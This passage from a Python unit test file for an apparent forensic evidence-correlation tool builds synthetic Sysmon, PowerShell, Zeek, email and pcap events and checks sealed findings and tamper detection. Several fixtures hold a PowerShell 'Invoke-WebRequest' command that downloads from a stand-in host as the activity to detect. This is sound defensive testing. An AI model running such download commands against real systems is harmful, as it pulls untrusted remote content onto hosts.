                / "evidence"
            )

            output = (
                Path(temp)
                / "case-output"
            )

            root.mkdir()

            (
                root
                / "unknown.bin"
            ).write_bytes(
                b"x"
            )

            analyze_case(
                evidence_directory=root,
                output_directory=output,
            )

            index_path = (
                output
                / "raw-evidence-index.json"
            )

            payload = json.loads(
                index_path.read_text(
                    encoding="utf-8"
                )
            )

            payload[
                "raw_evidence_files"
            ][0][
                "case_relative_path"
            ] = (
                "../outside.bin"
            )

            index_path.write_text(
                json.dumps(
                    payload,
                    sort_keys=True,
                    indent=2,
                )
                + "\n",
                encoding="utf-8",
            )

            with self.assertRaises(
                RuntimeError
            ):
                verify_case_seal(
                    output
                )


    def test_corroborated_hypotheses_become_sealed_case_findings(
        self,
    ) -> None:
        sysmon = (
            correlation_case_event(
                source_type=(
                    SourceType.SYSMON
                ),
                event_type=(
                    "process_create"
                ),
                record_index=100,
                event_time_utc=datetime(
                    2026,
                    9,
                    22,
                    11,
                    59,
                    50,
                    tzinfo=timezone.utc,
                ),
                host="HOST-1",
                principal=(
                    r"DOMAIN\User1"
                ),
                semantic_fields={
                    "process_name": (
                        r"C:\Windows\System32"
                        r"\WindowsPowerShell\v1.0"
                        r"\powershell.exe"
                    ),
                    "local_ip":
                        "10.0.0.5",
                },
            )
        )

        powershell = (
            correlation_case_event(
                source_type=(
                    SourceType.POWERSHELL
                ),
                event_type=(
                    "script_execution"
                ),
                record_index=101,
                event_time_utc=datetime(
                    2026,
                    9,
                    22,
                    12,
                    0,
                    0,
                    tzinfo=timezone.utc,
                ),
                host="HOST-1",
                principal=(
                    r"DOMAIN\User1"
                ),
                semantic_fields={
                    "engine":
                        "powershell.exe",

                    "script_text": (
                        "Invoke-WebRequest "
                        "http://198.51.100.20:8080/a"
                    ),

                    "local_ip":
                        "10.0.0.5",
                },
            )
        )

        zeek = (
            correlation_case_event(
                source_type=(
                    SourceType.ZEEK
                ),
                event_type=(
                    "network_connection"
                ),
                record_index=102,
                event_time_utc=datetime(
                    2026,
                    9,
                    22,
                    12,
                    0,
                    10,
                    tzinfo=timezone.utc,
                ),
                host="HOST-1",
                principal=None,
                semantic_fields={
                    "src_ip":
                        "10.0.0.5",

                    "dst_ip":
                        "198.51.100.20",

                    "dst_port":
                        8080,
                },
            )
        )

        intake = (
            correlation_case_intake(
                sysmon,
                powershell,
                zeek,
            )
        )

        with tempfile.TemporaryDirectory() as temp:
            root = (
                Path(temp)
                / "evidence"
            )

            output = (
                Path(temp)
                / "case-output"
            )

            root.mkdir()

            (
                root
                / "synthetic-correlation-case.xml"
            ).write_bytes(
                b"synthetic bounded correlation case"
            )

            with patch(
                "tracesoc.cli.case."
                "ingest_evidence_directory",
                return_value=intake,
            ):
                result = (
                    analyze_case(
                        evidence_directory=root,
                        output_directory=output,
                    )
                )

            findings = json.loads(
                (
                    output
                    / "findings.json"
                ).read_text(
                    encoding="utf-8"
                )
            )[
                "findings"
            ]

            hypotheses = json.loads(
                (
                    output
                    / "hypotheses.json"
                ).read_text(
                    encoding="utf-8"
                )
            )[
                "hypotheses"
            ]

            manifest = json.loads(
                (
                    output
                    / "case-manifest.json"
                ).read_text(
                    encoding="utf-8"
                )
            )

            seal = json.loads(
                (
                    output
                    / "case-seal.json"
                ).read_text(
                    encoding="utf-8"
                )
            )

            verification = (
                verify_case_seal(
                    output
                )
            )

        self.assertEqual(
            result[
                "finding_count"
            ],
            2,
        )

        self.assertEqual(
            len(
                findings
            ),
            2,
        )

        self.assertEqual(
            {
                item[
                    "hypothesis_id"
                ]
                for item
                in findings
            },
            {
                item[
                    "hypothesis_id"
                ]
                for item
                in hypotheses
            },
        )

        self.assertTrue(
            all(
                item[
                    "finding_id"
                ].startswith(
                    "fnd_"
                )
                for item
                in findings
            )
        )

        self.assertTrue(
            all(
                item[
                    "evidence_state"
                ]
                == "CORROBORATED"
                for item
                in findings
            )
        )

        self.assertTrue(
            all(
                item[
                    "incident_status"
                ]
                == "NOT_ESTABLISHED"
                for item
                in findings
            )
        )

        self.assertTrue(
            all(
                item[
                    "malicious_intent_status"
                ]
                == "NOT_ESTABLISHED"
                for item
                in findings
            )
        )

        self.assertTrue(
            all(
                len(
                    item[
                        "detection_result_ids"
                    ]
                )
                == 1
                for item
                in findings
            )
        )

        self.assertTrue(
            all(
                item[
                    "detection_result_ids"
                ][0].startswith(
                    "detres_"
                )
                for item
                in findings
            )
        )

        self.assertTrue(
            all(
                len(
                    item[
                        "supporting_relationship_ids"
                    ]
                )
                == 1
                for item
                in findings
            )
        )

        self.assertTrue(
            all(
                len(
                    item[
                        "observation_ids"
                    ]
                )
                == 2
                for item
                in findings
            )
        )

        self.assertTrue(
            all(
                isinstance(
                    item[
                        "alternative_or_falsifier"
                    ],
                    str,
                )
                and bool(
                    item[
                        "alternative_or_falsifier"
                    ].strip()
                )
                for item
                in findings
            )
        )

        self.assertEqual(
            manifest[
                "analysis_counts"
            ][
                "findings"
            ],
            2,
        )

        self.assertTrue(
            manifest[
                "analytic_boundary"
            ][
                "generic_findings_created"
            ]
        )

        self.assertFalse(
            manifest[
                "finding_boundary"
            ][
                "incident_declared"
            ]
        )

        self.assertFalse(
            manifest[
                "finding_boundary"
            ][
                "malicious_intent_established"
            ]
        )

        sealed_names = [
            item[
                "path"
            ]
            for item
            in seal[
                "files"
            ]
        ]

        self.assertIn(
            "findings.json",
            sealed_names,
        )

        self.assertTrue(
            verification[
                "seal_verified"
            ]
        )


    def test_unmatched_correlation_creates_no_case_finding(
        self,
    ) -> None:
        powershell = (
            correlation_case_event(
                source_type=(
                    SourceType.POWERSHELL
                ),
                event_type=(
                    "script_execution"
                ),
                record_index=110,
                event_time_utc=datetime(
                    2026,
                    9,
                    22,
                    12,
                    0,
                    0,
                    tzinfo=timezone.utc,
                ),
                host="HOST-A",
                principal=(
                    r"DOMAIN\User1"
                ),
                semantic_fields={
                    "engine":
                        "powershell.exe",

                    "script_text": (
                        "Invoke-WebRequest "
                        "http://198.51.100.20:8080/a"
                    ),

                    "local_ip":
                        "10.0.0.5",
                },
            )
        )

        zeek = (
            correlation_case_event(
                source_type=(
                    SourceType.ZEEK
                ),
                event_type=(
                    "network_connection"
                ),
                record_index=111,
                event_time_utc=datetime(
                    2026,
                    9,
                    22,
                    12,
                    0,
                    0,
                    tzinfo=timezone.utc,
                ),
                host="HOST-B",
                principal=None,
                semantic_fields={
                    "src_ip":
                        "10.0.0.5",

                    "dst_ip":
                        "198.51.100.20",

                    "dst_port":
                        8080,
                },
            )
        )

        intake = (
            correlation_case_intake(
                powershell,
                zeek,
            )
        )

        with tempfile.TemporaryDirectory() as temp:
            root = (
                Path(temp)
                / "evidence"
            )

            output = (
                Path(temp)
                / "case-output"
            )

            root.mkdir()

            (
                root
                / "synthetic-correlation-case.xml"
            ).write_bytes(
                b"synthetic bounded correlation case"
            )

            with patch(
                "tracesoc.cli.case."
                "ingest_evidence_directory",
                return_value=intake,
            ):
                result = (
                    analyze_case(
                        evidence_directory=root,
                        output_directory=output,
                    )
                )

            findings = json.loads(
                (
                    output
                    / "findings.json"
                ).read_text(
                    encoding="utf-8"
                )
            )[
                "findings"
            ]

            hypotheses = json.loads(
                (
                    output
                    / "hypotheses.json"
                ).read_text(
                    encoding="utf-8"
                )
            )[
                "hypotheses"
            ]

        self.assertEqual(
            hypotheses,
            [],
        )

        self.assertEqual(
            findings,
            [],
        )

        self.assertEqual(
            result[
                "hypothesis_count"
            ],
            0,
        )

        self.assertEqual(
            result[
                "finding_count"
            ],
            0,
        )


    def test_case_explain_resolves_finding_to_sealed_raw_evidence(
        self,
    ) -> None:
        from tracesoc.cli.explain import (
            explain_case_finding,
        )

        sysmon = (
            correlation_case_event(
                source_type=(
                    SourceType.SYSMON
                ),
                event_type=(
                    "process_create"
                ),
                record_index=200,
                event_time_utc=datetime(
                    2026,
                    9,
                    22,
                    11,
                    59,
                    50,
                    tzinfo=timezone.utc,
                ),
                host="HOST-1",
                principal=(
                    r"DOMAIN\User1"
                ),
                semantic_fields={
                    "process_name": (
                        r"C:\Windows\System32"
                        r"\WindowsPowerShell\v1.0"
                        r"\powershell.exe"
                    ),
                    "local_ip":
                        "10.0.0.5",
                },
            )
        )

        powershell = (
            correlation_case_event(
                source_type=(
                    SourceType.POWERSHELL
                ),
                event_type=(
                    "script_execution"
                ),
                record_index=201,
                event_time_utc=datetime(
                    2026,
                    9,
                    22,
                    12,
                    0,
                    0,
                    tzinfo=timezone.utc,
                ),
                host="HOST-1",
                principal=(
                    r"DOMAIN\User1"
                ),
                semantic_fields={
                    "engine":
                        "powershell.exe",

                    "script_text": (
                        "Invoke-WebRequest "
                        "http://198.51.100.20:8080/a"
                    ),

                    "local_ip":
                        "10.0.0.5",
                },
            )
        )

        zeek = (
            correlation_case_event(
                source_type=(
                    SourceType.ZEEK
                ),
                event_type=(
                    "network_connection"
                ),
                record_index=202,
                event_time_utc=datetime(
                    2026,
                    9,
                    22,
                    12,
                    0,
                    10,
                    tzinfo=timezone.utc,
                ),
                host="HOST-1",
                principal=None,
                semantic_fields={
                    "src_ip":
                        "10.0.0.5",

                    "dst_ip":
                        "198.51.100.20",

                    "dst_port":
                        8080,
                },
            )
        )

        intake = (
            correlation_case_intake(
                sysmon,
                powershell,
                zeek,
            )
        )

        with tempfile.TemporaryDirectory() as temp:
            root = (
                Path(temp)
                / "evidence"
            )

            output = (
                Path(temp)
                / "case-output"
            )

            root.mkdir()

            raw_bytes = (
                b"synthetic bounded correlation case"
            )

            (
                root
                / "synthetic-correlation-case.xml"
            ).write_bytes(
                raw_bytes
            )

            with patch(
                "tracesoc.cli.case."
                "ingest_evidence_directory",
                return_value=intake,
            ):
                analyze_case(
                    evidence_directory=root,
                    output_directory=output,
                )

            findings = json.loads(
                (
                    output
                    / "findings.json"
                ).read_text(
                    encoding="utf-8"
                )
            )[
                "findings"
            ]

            self.assertEqual(
                len(
                    findings
                ),
                2,
            )

            finding_id = (
                findings[0][
                    "finding_id"
                ]
            )

            explanation = (
                explain_case_finding(
                    case_directory=output,
                    finding_id=(
                        finding_id
                    ),
                )
            )

        self.assertEqual(
            explanation[
                "finding"
            ][
                "finding_id"
            ],
            finding_id,
        )

        self.assertTrue(
            explanation[
                "case_seal_verified"
            ]
        )

        self.assertTrue(
            explanation[
                "reverse_proof"
            ][
                "reverse_chain_complete"
            ]
        )

        self.assertTrue(
            explanation[
                "reverse_proof"
            ][
                "finding_to_detection_results_verified"
            ]
        )

        self.assertTrue(
            explanation[
                "reverse_proof"
            ][
                "finding_to_relationships_verified"
            ]
        )

        self.assertTrue(
            explanation[
                "reverse_proof"
            ][
                "finding_to_observations_verified"
            ]
        )

        self.assertTrue(
            explanation[
                "reverse_proof"
            ][
                "observation_to_raw_locator_verified"
            ]
        )

        self.assertTrue(
            explanation[
                "reverse_proof"
            ][
                "observation_to_embedded_artifact_verified"
            ]
        )

        self.assertGreaterEqual(
            explanation[
                "reverse_proof"
            ][
                "embedded_raw_hashes_verified"
            ],
            2,
        )

        self.assertTrue(
            all(
                item[
                    "embedded_raw_hash_verified"
                ]
                for item
                in explanation[
                    "raw_evidence"
                ]
            )
        )

        self.assertTrue(
            all(
                item[
                    "raw_locator_reached"
                ]
                for item
                in explanation[
                    "raw_evidence"
                ]
            )
        )

        self.assertTrue(
            all(
                item[
                    "case_relative_path"
                ].startswith(
                    "raw-evidence/"
                )
                for item
                in explanation[
                    "raw_evidence"
                ]
            )
        )

        finding_detection_ids = set(
            explanation[
                "finding"
            ][
                "detection_result_ids"
            ]
        )

        resolved_detection_ids = {
            item[
                "detection_result_id"
            ]
            for item
            in explanation[
                "detection_results"
            ]
        }

        self.assertEqual(
            finding_detection_ids,
            resolved_detection_ids,
        )

        finding_relationship_ids = set(
            explanation[
                "finding"
            ][
                "supporting_relationship_ids"
            ]
        )

        resolved_relationship_ids = {
            item[
                "relationship_id"
            ]
            for item
            in explanation[
                "supporting_relationships"
            ]
        }

        self.assertEqual(
            finding_relationship_ids,
            resolved_relationship_ids,
        )

        finding_observation_ids = set(
            explanation[
                "finding"
            ][
                "observation_ids"
            ]
        )

        resolved_observation_ids = {
            item[
                "event_id"
            ]
            for item
            in explanation[
                "observations"
            ]
        }

        self.assertEqual(
            finding_observation_ids,
            resolved_observation_ids,
        )

        self.assertEqual(
            explanation[
                "claim_boundary"
            ][
                "incident_status"
            ],
            "NOT_ESTABLISHED",
        )

        self.assertEqual(
            explanation[
                "claim_boundary"
            ][
                "malicious_intent_status"
            ],
            "NOT_ESTABLISHED",
        )


    def test_case_explain_cli_json_uses_real_finding_id(
        self,
    ) -> None:
        from contextlib import (
            redirect_stdout,
        )
        from io import StringIO
        from tracesoc.cli.explain import (
            main as explain_main,
        )

        sysmon = (
            correlation_case_event(
                source_type=(
                    SourceType.SYSMON
                ),
                event_type=(
                    "process_create"
                ),
                record_index=210,
                event_time_utc=datetime(
                    2026,
                    9,
                    22,
                    11,
                    59,
                    50,
                    tzinfo=timezone.utc,
                ),
                host="HOST-1",
                principal=(
                    r"DOMAIN\User1"
                ),
                semantic_fields={
                    "process_name":
                        "powershell.exe",

                    "local_ip":
                        "10.0.0.5",
                },
            )
        )

        powershell = (
            correlation_case_event(
                source_type=(
                    SourceType.POWERSHELL
                ),
                event_type=(
                    "script_execution"
                ),
                record_index=211,
                event_time_utc=datetime(
                    2026,
                    9,
                    22,
                    12,
                    0,
                    0,
                    tzinfo=timezone.utc,
                ),
                host="HOST-1",
                principal=(
                    r"DOMAIN\User1"
                ),
                semantic_fields={
                    "engine":
                        "powershell.exe",

                    "script_text": (
                        "Invoke-WebRequest "
                        "http://198.51.100.20:8080/a"
                    ),

                    "local_ip":
                        "10.0.0.5",
                },
            )
        )

        zeek = (
            correlation_case_event(
                source_type=(
                    SourceType.ZEEK
                ),
                event_type=(
                    "network_connection"
                ),
                record_index=212,
                event_time_utc=datetime(
                    2026,
                    9,
                    22,
                    12,
                    0,
                    10,
                    tzinfo=timezone.utc,
                ),
                host="HOST-1",
                principal=None,
                semantic_fields={
                    "src_ip":
                        "10.0.0.5",

                    "dst_ip":
                        "198.51.100.20",

                    "dst_port":
                        8080,
                },
            )
        )

        intake = (
            correlation_case_intake(
                sysmon,
                powershell,
                zeek,
            )
        )

        with tempfile.TemporaryDirectory() as temp:
            root = (
                Path(temp)
                / "evidence"
            )

            output = (
                Path(temp)
                / "case-output"
            )

            root.mkdir()

            (
                root
                / "synthetic-correlation-case.xml"
            ).write_bytes(
                b"synthetic bounded correlation case"
            )

            with patch(
                "tracesoc.cli.case."
                "ingest_evidence_directory",
                return_value=intake,
            ):
                analyze_case(
                    evidence_directory=root,
                    output_directory=output,
                )

            findings = json.loads(
                (
                    output
                    / "findings.json"
                ).read_text(
                    encoding="utf-8"
                )
            )[
                "findings"
            ]

            finding_id = (
                findings[0][
                    "finding_id"
                ]
            )

            stream = StringIO()

            with redirect_stdout(
                stream
            ):
                exit_code = (
                    explain_main(
                        [
                            "explain",
                            finding_id,
                            "--case",
                            str(
                                output
                            ),
                            "--json",
                        ]
                    )
                )

            payload = json.loads(
                stream.getvalue()
            )

        self.assertEqual(
            exit_code,
            0,
        )

        self.assertEqual(
            payload[
                "finding"
            ][
                "finding_id"
            ],
            finding_id,
        )

        self.assertTrue(
            payload[
                "reverse_proof"
            ][
                "reverse_chain_complete"
            ]
        )

        self.assertTrue(
            payload[
                "case_seal_verified"
            ]
        )


    def test_case_explain_fails_if_embedded_raw_evidence_is_tampered(
        self,
    ) -> None:
        from tracesoc.cli.case import (
            CaseAnalysisError,
        )
        from tracesoc.cli.explain import (
            CaseExplainIntegrityError,
            explain_case_finding,
        )

        powershell = (
            correlation_case_event(
                source_type=(
                    SourceType.POWERSHELL
                ),
                event_type=(
                    "script_execution"
                ),
                record_index=220,
                event_time_utc=datetime(
                    2026,
                    9,
                    22,
                    12,
                    0,
                    0,
                    tzinfo=timezone.utc,
                ),
                host="HOST-1",
                principal=(
                    r"DOMAIN\User1"
                ),
                semantic_fields={
                    "engine":
                        "powershell.exe",

                    "script_text": (
                        "Invoke-WebRequest "
                        "http://198.51.100.20:8080/a"
                    ),

                    "local_ip":
                        "10.0.0.5",
                },
            )
        )

        zeek = (
            correlation_case_event(
                source_type=(
                    SourceType.ZEEK
                ),
                event_type=(
                    "network_connection"
                ),
                record_index=221,
                event_time_utc=datetime(
                    2026,
                    9,
                    22,
                    12,
                    0,
                    10,
                    tzinfo=timezone.utc,
                ),
                host="HOST-1",
                principal=None,
                semantic_fields={
                    "src_ip":
                        "10.0.0.5",

                    "dst_ip":
                        "198.51.100.20",

                    "dst_port":
                        8080,
                },
            )
        )

        intake = (
            correlation_case_intake(
                powershell,
                zeek,
            )
        )

        with tempfile.TemporaryDirectory() as temp:
            root = (
                Path(temp)
                / "evidence"
            )

            output = (
                Path(temp)
                / "case-output"
            )

            root.mkdir()

            (
                root
                / "synthetic-correlation-case.xml"
            ).write_bytes(
                b"synthetic bounded correlation case"
            )

            with patch(
                "tracesoc.cli.case."
                "ingest_evidence_directory",
                return_value=intake,
            ):
                analyze_case(
                    evidence_directory=root,
                    output_directory=output,
                )

            findings = json.loads(
                (
                    output
                    / "findings.json"
                ).read_text(
                    encoding="utf-8"
                )
            )[
                "findings"
            ]

            finding_id = (
                findings[0][
                    "finding_id"
                ]
            )

            (
                output
                / "raw-evidence"
                / "synthetic-correlation-case.xml"
            ).write_bytes(
                b"tampered"
            )

            with self.assertRaises(
                (
                    CaseAnalysisError,
                    CaseExplainIntegrityError,
                )
            ):
                explain_case_finding(
                    case_directory=output,
                    finding_id=(
                        finding_id
                    ),
                )


    def test_real_eml_and_pcap_native_observations_enter_sealed_canonical_stream(
        self,
    ) -> None:
        import ipaddress
        import struct

        def ethernet_ipv4_tcp(
            *,
            source_ip: str,
            destination_ip: str,
            source_port: int,
            destination_port: int,
        ) -> bytes:
            ethernet = (
                b"\x00\x11\x22\x33\x44\x55"
                b"\x66\x77\x88\x99\xaa\xbb"
                + struct.pack(
                    "!H",
                    0x0800,
                )
            )

            source = (
                ipaddress.IPv4Address(
                    source_ip
                ).packed
            )

            destination = (
                ipaddress.IPv4Address(
                    destination_ip
                ).packed
            )

            tcp = struct.pack(
                "!HHIIHHHH",
                source_port,
                destination_port,
                0,
                0,
                5 << 12,
                0,
                0,
                0,
            )

            ipv4 = struct.pack(
                "!BBHHHBBH4s4s",
                0x45,
                0,
                20 + len(
                    tcp
                ),
                1,
                0,
                64,
                6,
                0,
                source,
                destination,
            )

            return (
                ethernet
                + ipv4
                + tcp
            )

        def classic_pcap(
            frame: bytes,
        ) -> bytes:
            global_header = (
                b"\xd4\xc3\xb2\xa1"
                + struct.pack(
                    "<HHiIII",
                    2,
                    4,
                    0,
                    0,
                    65535,
                    1,
                )
            )

            packet_header = (
                struct.pack(
                    "<IIII",
                    1_700_000_001,
                    123456,
                    len(
                        frame
                    ),
                    len(
                        frame
                    ),
                )
            )

            return (
                global_header
                + packet_header
                + frame
            )

        with tempfile.TemporaryDirectory() as temp:
            root = (
                Path(temp)
                / "evidence"
            )

            output = (
                Path(temp)
                / "case-output"
            )

            root.mkdir()

            eml_bytes = (
                b"From: sender@example.test\r\n"
                b"To: recipient@example.test\r\n"
                b"Date: Tue, 22 Sep 2026 13:30:00 +0100\r\n"
                b"Message-ID: <case@example.test>\r\n"
                b"Subject: Native canonical case\r\n"
                b"Content-Type: text/plain; charset=utf-8\r\n"
                b"\r\n"
                b"hello from raw email\r\n"
            )

            (
                root
                / "message.eml"
            ).write_bytes(
                eml_bytes
            )

            frame = ethernet_ipv4_tcp(
                source_ip=(
                    "192.0.2.10"
                ),
                destination_ip=(
                    "198.51.100.20"
                ),
                source_port=50000,
                destination_port=443,
            )

            pcap_bytes = classic_pcap(
                frame
            )

            (
                root
                / "capture.pcap"
            ).write_bytes(
                pcap_bytes
            )

            result = analyze_case(
                evidence_directory=root,
                output_directory=output,
            )

            self.assertTrue(
                result[
                    "seal_verified"
                ]
            )

            self.assertEqual(
                result[
                    "artifact_count"
                ],
                2,
            )

            self.assertEqual(
                result[
                    "raw_evidence_file_count"
                ],
                2,
            )

            self.assertEqual(
                result[
                    "raw_evidence_hashes_verified"
                ],
                2,
            )

            events_payload = json.loads(
                (
                    output
                    / "normalized-events.json"
                ).read_text(
                    encoding="utf-8"
                )
            )

            events = (
                events_payload[
                    "events"
                ]
            )

            self.assertEqual(
                result[
                    "canonical_event_count"
                ],
                len(
                    events
                ),
            )

            source_types = {
                event[
                    "source_type"
                ]
                for event
                in events
            }

            self.assertEqual(
                source_types,
                {
                    "email",
                    "pcap",
                },
            )

            email_events = [
                event
                for event
                in events
                if event[
                    "source_type"
                ]
                == "email"
            ]

            pcap_events = [
                event
                for event
                in events
                if event[
                    "source_type"
                ]
                == "pcap"
            ]

            self.assertGreaterEqual(
                len(
                    email_events
                ),
                2,
            )

            self.assertEqual(
                len(
                    pcap_events
                ),
                1,
            )

            message_events = [
                event
                for event
                in email_events
                if event[
                    "source_context"
                ].get(
                    "message_id"
                )
                == "<case@example.test>"
            ]

            self.assertEqual(
                len(
                    message_events
                ),
                1,
            )

            message_event = (
                message_events[0]
            )

            self.assertEqual(
                message_event[
                    "raw_locator"
                ][
                    "logical_source"
                ],
                "message.eml",
            )

            self.assertEqual(
                message_event[
                    "clock_state"
                ],
                "observed",
            )

            self.assertEqual(
                message_event[
                    "source_context"
                ][
                    "native_locator"
                ][
                    "locator_kind"
                ],
                "BYTE_RANGE",
            )

            mime_events = [
                event
                for event
                in email_events
                if event[
                    "source_context"
                ][
                    "native_locator"
                ][
                    "locator_kind"
                ]
                == "MIME_PART"
            ]

            self.assertGreaterEqual(
                len(
                    mime_events
                ),
                1,
            )

            self.assertTrue(
                all(
                    event[
                        "source_context"
                    ][
                        "native_locator"
                    ][
                        "mime_part_path"
                    ]
                    is not None
                    for event
                    in mime_events
                )
            )

            pcap_event = (
                pcap_events[0]
            )

            self.assertEqual(
                pcap_event[
                    "event_type"
                ],
                "network_packet",
            )

            self.assertEqual(
                pcap_event[
                    "raw_locator"
                ][
                    "logical_source"
                ],
                "capture.pcap",
            )

            self.assertEqual(
                pcap_event[
                    "raw_locator"
                ][
                    "record_index"
                ],
                0,
            )

            self.assertEqual(
                pcap_event[
                    "raw_locator"
                ][
                    "byte_offset"
                ],
                40,
            )

            self.assertEqual(
                pcap_event[
                    "raw_locator"
                ][
                    "byte_length"
                ],
                len(
                    frame
                ),
            )

            native_pcap_locator = (
                pcap_event[
                    "source_context"
                ][
                    "native_locator"
                ]
            )

            self.assertEqual(
                native_pcap_locator[
                    "locator_kind"
                ],
                "PCAP_PACKET",
            )

            self.assertEqual(
                native_pcap_locator[
                    "packet_number"
                ],
                1,
            )

            self.assertEqual(
                native_pcap_locator[
                    "byte_offset"
                ],
                40,
            )

            self.assertEqual(
                pcap_event[
                    "semantic_fields"
                ][
                    "src_ip"
                ],
                "192.0.2.10",
            )

            self.assertEqual(
                pcap_event[
                    "semantic_fields"
                ][
                    "dst_ip"
                ],
                "198.51.100.20",
            )

            self.assertEqual(
                pcap_event[
                    "semantic_fields"
                ][
                    "src_port"
                ],
                50000,
            )

            self.assertEqual(
                pcap_event[
                    "semantic_fields"
                ][
                    "dst_port"
                ],
                443,
            )

            self.assertEqual(
                pcap_event[
                    "semantic_fields"
                ][
                    "protocol"
                ],
                "tcp",
            )

            manifest = json.loads(
                (
                    output
                    / "case-manifest.json"
                ).read_text(
                    encoding="utf-8"
                )
            )

            analysis_counts = (
                manifest[
                    "analysis_counts"
                ]
            )

            self.assertEqual(
                analysis_counts[
                    "canonical_events"
                ],
                len(
                    events
                ),
            )

            self.assertEqual(
                analysis_counts[
                    "native_observations"
                ],
                3,
            )

            raw_index = json.loads(
                (
                    output
                    / "raw-evidence-index.json"
                ).read_text(
                    encoding="utf-8"
                )
            )

            raw_sources = {
                record[
                    "source_path_display"
                ]
                for record
                in raw_index[
                    "raw_evidence_files"
                ]
            }

            self.assertEqual(
                raw_sources,
                {
                    "message.eml",
                    "capture.pcap",
                },
            )

            verification = (
                verify_case_seal(
                    output
                )
            )

            self.assertTrue(
                verification[
                    "seal_verified"
                ]
            )

            self.assertEqual(
                verification[
                    "raw_evidence_file_count"
                ],
                2,
            )


    def test_case_runner_emits_sysmon_pcap_tuple_corroboration(
        self,
    ) -> None:
        sysmon = (
            correlation_case_event(
                source_type=(
                    SourceType.SYSMON
                ),
                event_type=(
                    "network_connection"
                ),
                record_index=300,
                event_time_utc=datetime(
                    2026,
                    9,
                    22,
                    12,
                    0,
                    0,
                    tzinfo=timezone.utc,
                ),
                host="HOST-1",
                principal=(
                    r"DOMAIN\User1"
                ),
                semantic_fields={
                    "process_name":
                        "powershell.exe",

                    "process_id":
                        "500",

                    "process_guid":
                        "{NETWORK-GUID}",

                    "src_ip":
                        "10.0.0.5",

                    "src_port":
                        "50000",

                    "dst_ip":
                        "198.51.100.20",

                    "dst_port":
                        "443",

                    "proto":
                        "tcp",

                    "initiated":
                        "true",
                },
            )
        )

        pcap = (
            correlation_case_event(
                source_type=(
                    SourceType.PCAP
                ),
                event_type=(
                    "network_packet"
                ),
                record_index=301,
                event_time_utc=datetime(
                    2026,
                    9,
                    22,
                    12,
                    0,
                    0,
                    500000,
                    tzinfo=timezone.utc,
                ),
                host="",
                principal=None,
                semantic_fields={
                    "src_ip":
                        "10.0.0.5",

                    "src_port":
                        50000,

                    "dst_ip":
                        "198.51.100.20",

                    "dst_port":
                        443,

                    "protocol":
                        "tcp",
                },
            )
        )

        intake = (
            correlation_case_intake(
                sysmon,
                pcap,
            )
        )

        with tempfile.TemporaryDirectory() as temp:
            root = (
                Path(temp)
                / "evidence"
            )

            output = (
                Path(temp)
                / "case-output"
            )

            root.mkdir()

            (
                root
                / "synthetic-correlation-case.xml"
            ).write_bytes(
                b"synthetic bounded correlation case"
            )

            with patch(
                "tracesoc.cli.case."
                "ingest_evidence_directory",
                return_value=intake,
            ):
                result = analyze_case(
                    evidence_directory=root,
                    output_directory=output,
                )

            correlations = json.loads(
                (
                    output
                    / "correlations.json"
                ).read_text(
                    encoding="utf-8"
                )
            )[
                "correlations"
            ]

            relationships = json.loads(
                (
                    output
                    / "relationships.json"
                ).read_text(
                    encoding="utf-8"
                )
            )[
                "relationships"
            ]

            hypotheses = json.loads(
                (
                    output
                    / "hypotheses.json"
                ).read_text(
                    encoding="utf-8"
                )
            )[
                "hypotheses"
            ]

            findings = json.loads(
                (
                    output
                    / "findings.json"
                ).read_text(
                    encoding="utf-8"
                )
            )[
                "findings"
            ]

            manifest = json.loads(
                (
                    output
                    / "case-manifest.json"
                ).read_text(
                    encoding="utf-8"
                )
            )

            self.assertTrue(
                verify_case_seal(
                    output
                )[
                    "seal_verified"
                ]
            )

        self.assertEqual(
            result[
                "correlation_evaluation_count"
            ],
            1,
        )

        self.assertEqual(
            result[
                "matched_correlation_count"
            ],
            1,
        )

        self.assertEqual(
            result[
                "relationship_count"
            ],
            1,
        )

        self.assertEqual(
            result[
                "hypothesis_count"
            ],
            1,
        )

        self.assertEqual(
            result[
                "finding_count"
            ],
            1,
        )

        self.assertEqual(
            len(
                correlations
            ),
            1,
        )

        correlation = (
            correlations[0]
        )

        self.assertEqual(
            correlation[
                "correlation_id"
            ],
            "TRC-CORR-003",
        )

        self.assertTrue(
            correlation[
                "matched"
            ]
        )

        self.assertEqual(
            correlation[
                "source_event_id"
            ],
            sysmon.event_id,
        )

        self.assertEqual(
            correlation[
                "source_kind"
            ],
            "sysmon_network",
        )

        self.assertIsNone(
            correlation[
                "powershell_event_id"
            ]
        )

        self.assertEqual(
            correlation[
                "candidate_event_id"
            ],
            pcap.event_id,
        )

        self.assertEqual(
            correlation[
                "candidate_kind"
            ],
            "pcap_packet",
        )

        self.assertEqual(
            len(
                relationships
            ),
            1,
        )

        relationship = (
            relationships[0]
        )

        self.assertEqual(
            relationship[
                "legacy_correlation_id"
            ],
            "TRC-CORR-003",
        )

        self.assertEqual(
            relationship[
                "relationship_type"
            ],
            "CORROBORATES",
        )

        anchors = {
            (
                item[
                    "anchor_type"
                ],
                item[
                    "value"
                ],
                item[
                    "temporal"
                ],
            )
            for item
            in relationship[
                "anchors"
            ]
        }

        self.assertIn(
            (
                "source_ip",
                "10.0.0.5",
                False,
            ),
            anchors,
        )

        self.assertIn(
            (
                "source_port",
                "50000",
                False,
            ),
            anchors,
        )

        self.assertIn(
            (
                "destination_ip",
                "198.51.100.20",
                False,
            ),
            anchors,
        )

        self.assertIn(
            (
                "destination_port",
                "443",
                False,
            ),
            anchors,
        )

        self.assertIn(
            (
                "protocol",
                "tcp",
                False,
            ),
            anchors,
        )

        self.assertTrue(
            any(
                item[
                    "anchor_type"
                ]
                == "absolute_delta_seconds"
                and item[
                    "temporal"
                ]
                for item
                in relationship[
                    "anchors"
                ]
            )
        )

        self.assertEqual(
            len(
                hypotheses
            ),
            1,
        )

        self.assertEqual(
            hypotheses[0][
                "evidence_state"
            ],
            "CORROBORATED",
        )

        self.assertEqual(
            len(
                findings
            ),
            1,
        )

        self.assertEqual(
            findings[0][
                "incident_status"
            ],
            "NOT_ESTABLISHED",
        )

        self.assertEqual(
            findings[0][
                "malicious_intent_status"
            ],
            "NOT_ESTABLISHED",
        )

        self.assertEqual(
            manifest[
                "correlation_coverage"
            ][
                "evaluated_correlation_ids"
            ],
            [
                "TRC-CORR-001",
                "TRC-CORR-002",
                "TRC-CORR-003",
                "TRC-CORR-004",
                "TRC-CORR-005",
                "TRC-CORR-006",
            ],
        )

        self.assertFalse(
            manifest[
                "correlation_coverage"
            ][
                "timestamp_only_relationship_allowed"
            ]
        )

        self.assertTrue(
            manifest[
                "correlation_coverage"
            ][
                "non_temporal_anchor_required"
            ]
        )

